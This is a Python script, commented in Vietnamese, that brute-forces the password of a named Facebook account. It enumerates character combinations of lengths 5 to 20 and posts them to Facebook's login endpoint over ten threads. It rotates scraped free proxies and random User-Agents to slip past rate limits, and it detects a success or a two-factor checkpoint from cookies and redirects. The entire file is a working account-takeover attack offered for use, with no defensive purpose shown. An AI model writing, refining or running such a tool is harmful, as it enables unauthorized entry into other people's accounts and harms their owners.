import itertools
import requests
import threading
import queue
import random
import json

# Các ký tự để thử trong mật khẩu
characters = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890.?!@"

# Queue để chứa mật khẩu và kết quả
password_queue = queue.Queue()
result_queue = queue.Queue()

# URL của trang đăng nhập Facebook
login_url = "https://www.facebook.com/login.php"

# Đọc danh sách User-Agent từ tệp JSON
try:
    with open('user_agents.json', 'r') as file:
        user_agents = json.load(file)
    if not user_agents:
        raise ValueError("Danh sách user_agents trống!")
except (FileNotFoundError, json.JSONDecodeError, ValueError) as e:
    print(f"Lỗi khi đọc file user_agents.json: {str(e)}")
    user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]

# Hàm lấy proxy từ ProxyScrape
def get_proxies():
    try:
        response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
        proxies = response.text.splitlines()
        return proxies
    except requests.RequestException as e:
        print(f"Error fetching proxies: {str(e)}")
        return []

# Hàm thực hiện đăng nhập
def login(target, password, proxy=None):
    data = {
        'email': target,
        'pass': password,
        'login': 'Log In'
    }
    
    headers = {
        'User-Agent': random.choice(user_agents)
    }
    
    proxies = {"http": proxy, "https": proxy} if proxy else None
    
    try:
        response = requests.post(login_url, headers=headers, data=data, proxies=proxies, allow_redirects=False)
        
        if 'c_user' in response.cookies:
            return 1  # Đăng nhập thành công
        elif "checkpoint" in response.headers.get('location', ''):
            return 2  # Tài khoản yêu cầu xác minh 2 lớp
        return 0  # Đăng nhập thất bại
    except requests.RequestException as e:
        print(f"Error: {str(e)}")
        return -1  # Lỗi trong quá trình gửi yêu cầu

# Hàm sinh mật khẩu
def password_generator(max_length=20):
    length = 5
    while length <= max_length:
        for password in itertools.product(characters, repeat=length):
            password_queue.put(''.join(password))
        length += 1

# Hàm xử lý đa luồng
def worker(target, proxies):
    while True:
        password = password_queue.get()
        if password is None:
            password_queue.task_done()
            break
        proxy = random.choice(proxies) if proxies else None
        print(f"Thử mật khẩu: {password} với proxy: {proxy}")
        result = login(target, password, proxy)
        if result == 1:
            result_queue.put(f"[+] Thành công! Mật khẩu: {password}")
            break
        elif result == 2:
            result_queue.put(f"[!] Tài khoản bị khóa với xác minh 2 lớp. Mật khẩu là: {password}")
            break
        password_queue.task_done()

# Hàm chính để khởi chạy các luồng
def Main(target):
    num_threads = 10  # Số luồng để thử nghiệm

    # Lấy danh sách proxy
    proxies = get_proxies()
    if not proxies:
        print("Không có proxy. Đang thoát...")
        return

    # Tạo luồng thử mật khẩu
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(target, proxies))
        t.daemon = True
        t.start()
        threads.append(t)

    # Tạo luồng sinh mật khẩu
    pw_gen_thread = threading.Thread(target=lambda: password_generator(max_length=20))
    pw_gen_thread.daemon = True
    pw_gen_thread.start()

    # Đợi kết quả hoặc kết thúc
    while result_queue.empty() and any(t.is_alive() for t in threads):
        threading.Event().wait(1)

    # Hiển thị kết quả
    while not result_queue.empty():
        result = result_queue.get()
        print(result)

    # Dừng các luồng làm việc
    for _ in range(num_threads):
        password_queue.put(None)

    # Đảm bảo tất cả các luồng đã hoàn thành
    for t in threads:
        t.join()

    pw_gen_thread.join()

if __name__ == "__main__":
    target = input("Nhập email, ID hoặc số điện thoại của mục tiêu: ")
    Main(target)